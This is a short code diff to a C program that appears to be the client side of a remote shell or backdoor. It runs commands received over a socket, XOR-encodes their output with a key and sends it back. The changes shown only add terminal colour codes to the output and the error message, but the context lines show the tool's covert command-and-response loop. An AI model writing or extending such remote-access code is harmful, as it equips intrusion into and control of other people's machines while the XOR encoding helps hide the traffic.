@@ -133,7 +133,9 @@ int main(void) {
             					strcat(command, buffer);
 						memset(buffer, '\0', strlen(buffer));
         				}
-					
+				
+					strcat(command, reset);
+
 					char* xordata = XOR(command, key, strlen(command), keylen);
 					send(sock, xordata, strlen(command), 0);
 					free(xordata);
@@ -143,7 +145,7 @@ int main(void) {
 
 				}	
 				else{
-					char* error = "Failed to run command\n";
+					char* error = "\e[1;31m[-]\e[0m Failed to run command\n";
 					char* xorerror = XOR(error, key, strlen(error), keylen);
 					send(sock, xorerror, strlen(error), 0);
 					free(xorerror);
